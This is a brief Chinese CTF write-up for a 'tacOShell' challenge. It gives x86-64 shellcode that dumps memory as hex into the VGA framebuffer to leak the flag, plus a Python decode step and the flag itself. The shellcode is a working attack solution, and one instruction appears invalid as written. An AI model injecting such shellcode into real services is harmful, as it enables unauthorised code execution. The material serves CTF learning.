通过part-3-server.py我们可以知道我们要发送的是汇编指令对应的16进制，我们直接写汇编去读取flag即可。
```
    call next
next:
    pop rbp

    mov edi, 0xb8000

loop:
    mov rsi, byte [rbp]
    inc rbp
    call draw_byte
    jmp loop

draw_byte:
    /* rdi: framebuffer */
    /* rsi: byte */
    /* == CLOBBERS == */
    /* rsi, rbx, rax */

    mov rbx, rsi

    shr rsi, 4
    call draw_nibble

    mov rsi, rbx
    call draw_nibble

    ret

draw_nibble:
    /* rdi: framebuffer */
    /* rsi: nibble */
    /* == CLOBBERS == */
    /* rax */

    mov rax, rsi
    and al, 0x0f
    cmp al, 0x09
    ja is_char

is_digit:
    add al, 0x30
    jmp output

is_char:
    add al, 0x41 - 0x0a

output:
    mov ah, 0x1f

    mov word [rdi], ax
    add rdi, 2
    
    ret
```
返回信息中存在flag。

```python
import binascii

print(binascii.unhexlify(
    "666c61677b53346c31795f53653131535f7461634f5368656c6c5f633064335f62595f7448655f5365345f53683072657d"
).decode())
```

`flag{S4l1y_Se11S_tacOShell_c0d3_bY_tHe_Se4_Sh0re}`
